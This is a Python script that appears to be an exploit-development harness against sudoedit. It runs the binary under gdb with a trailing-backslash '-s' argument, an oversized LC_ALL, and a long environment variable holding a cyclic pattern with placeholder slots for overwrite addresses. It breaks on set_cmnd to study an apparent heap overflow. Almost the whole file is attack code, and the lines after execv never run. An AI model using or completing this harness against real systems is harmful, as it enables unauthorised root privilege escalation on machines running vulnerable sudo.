import json
import subprocess
import sys
import os

NEXT = "22223333"
LIBRARY = "00001111"
KNOWN = "AAAABBBB"
NAME = "CCCCDDDDEEEEFFFFGGGGHHHHIIII"

case = {
    "arg": 
        ["-A", "-s", "2"*112 + "\\"],
    "env": 
        {
            "LC_ALL": "V"*115, 
            "I"*49: "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaa"+NEXT+"aaanaaaaaaaoaaaaaaapaaaa"+LIBRARY+KNOWN+NAME
        }
    }

arg = case['arg']
env = case['env']

args = ["/usr/bin/gdb"]
args += ["-ex", "unset environment"]
for e in env:
    args += ["-ex", f"set environment {e} = {env[e]}"]
args += ["-ex", "set breakpoint pending on"]
args += ["-ex", "break set_cmnd"]
args += ["-ex", "break set_cmnd"]
args += ["-ex", "r "+" ".join([f"'{a}'" for a in arg])]

args += ["/usr/local/bin/sudoedit"]

os.execv("/usr/bin/gdb", args)
p = subprocess.Popen(args, env=env, bufsize=0,
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
try:
    lines = p.communicate(b"quit\nquit\nquit\nquit\n",timeout=1)
    print(lines[0].decode('utf-8'))
except subprocess.TimeoutExpired:
    p.terminate()
    pass
input()